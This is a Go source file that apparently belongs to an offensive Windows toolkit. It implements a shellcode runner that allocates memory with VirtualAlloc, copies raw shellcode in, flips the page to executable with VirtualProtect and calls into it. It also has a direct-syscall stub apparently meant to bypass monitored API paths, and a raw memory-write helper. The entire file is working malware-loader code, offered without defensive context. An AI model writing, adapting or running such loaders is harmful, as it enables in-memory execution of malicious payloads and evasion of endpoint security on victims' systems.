package core

import (
  "fmt"
  "unsafe"
  "syscall"

  "golang.org/x/sys/windows"
)

// Receives function address and arguments
func Syscall(callid uint16, argh ...uintptr) (errcode uint32, err error) {
  errcode = bpSyscall(callid, argh...)

  if errcode != 0 {
    err = fmt.Errorf("non-zero return from syscall")
  }
	
  return errcode, err
}

func bpSyscall(callid uint16, argh ...uintptr) (errcode uint32)

func Execute(shellcode []byte) (error) {
  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
  ntdll := windows.NewLazySystemDLL("ntdll.dll")

  VirtualAlloc := kernel32.NewProc("VirtualAlloc")
  VirtualProtect := kernel32.NewProc("VirtualProtect")
  RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

  // Allocate memory
  addr, _, _ := VirtualAlloc.Call(
    0,
    uintptr(len(shellcode)),
    windows.MEM_COMMIT | windows.MEM_RESERVE,
    windows.PAGE_READWRITE,
  )

  if (addr == 0) {
    return fmt.Errorf("VirtualAlloc failed and returned 0")
  }

  RtlCopyMemory.Call(
    addr,
    (uintptr)(unsafe.Pointer(&shellcode[0])),
    uintptr(len(shellcode)),
  )

  oldProtect := windows.PAGE_READWRITE
  // Protect memory
  VirtualProtect.Call(
    addr,
    uintptr(len(shellcode)),
    windows.PAGE_EXECUTE_READ,
    uintptr(unsafe.Pointer(&oldProtect)),
  )

  // Execute shellcode
  _, _, errSyscall := syscall.Syscall(
    addr,
    0,
    0,
    0,
    0,
  )
  
  if errSyscall != 0 {
    return fmt.Errorf("Error executing shellcode syscall: %s", errSyscall.Error())
  }

  return nil
}

func WriteMemory(inbuf []byte, destination uintptr) {
  for index := uint32(0); index < uint32(len(inbuf)); index++ {
    writePtr := unsafe.Pointer(destination + uintptr(index))
    v := (*byte)(writePtr)
    *v = inbuf[index]
  }
}

